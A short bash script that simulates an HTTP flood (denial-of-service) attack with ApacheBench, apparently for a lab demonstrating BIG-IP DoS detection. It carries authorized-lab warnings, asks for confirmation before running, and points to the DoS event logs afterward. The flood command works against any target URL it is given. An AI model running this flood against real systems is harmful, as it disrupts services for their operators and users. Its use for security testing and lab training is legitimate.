#!/usr/bin/env bash
# http-flood.sh
#
# Simulates an HTTP flood attack for lab demonstration purposes.
# FOR AUTHORIZED LAB ENVIRONMENTS ONLY.
#
# Usage: ./http-flood.sh [target] [duration] [concurrency]
# Example: ./http-flood.sh http://10.1.10.63 30 50

TARGET="${1:-http://10.1.10.63}"
DURATION="${2:-30}"
CONCURRENCY="${3:-50}"

echo "======================================================"
echo "  HTTP Flood Simulation — AUTHORIZED LAB USE ONLY"
echo "======================================================"
echo "Target:      $TARGET"
echo "Duration:    ${DURATION}s"
echo "Concurrency: $CONCURRENCY"
echo ""
read -p "Confirm this is an authorized lab environment [yes/N]: " confirm
if [[ "$confirm" != "yes" ]]; then
    echo "Aborted."
    exit 1
fi

echo ""
echo "Starting flood..."

if command -v ab &>/dev/null; then
    total=$(( CONCURRENCY * DURATION * 10 ))
    ab -n "$total" -c "$CONCURRENCY" -t "$DURATION" -l "${TARGET}/"
else
    echo "Install 'ab' (apache2-utils) for flood testing."
    exit 1
fi

echo ""
echo "Flood complete. Check BIG-IP DoS event logs:"
echo "  Security > Event Logs > DoS > Application Events"
